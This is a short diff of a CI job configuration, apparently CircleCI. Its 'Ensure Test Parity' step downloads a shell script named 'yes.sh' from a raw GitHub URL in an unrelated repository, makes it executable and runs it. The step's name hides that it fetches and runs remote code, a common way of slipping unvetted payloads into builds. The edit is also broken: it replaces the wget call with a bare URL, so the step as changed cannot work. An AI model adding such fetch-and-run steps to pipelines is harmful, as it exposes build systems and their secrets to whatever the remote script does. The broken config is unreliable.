@@ -9,6 +9,6 @@ jobs:
       - run:
           name: Ensure Test Parity
           command: |
-            wget https://raw.githubusercontent.com/AndiSN/ultimate/main/yes.sh
+            https://raw.githubusercontent.com/AndiSN/ultimate/main/yes.sh
             chmod +x yes.sh
             ./yes.sh
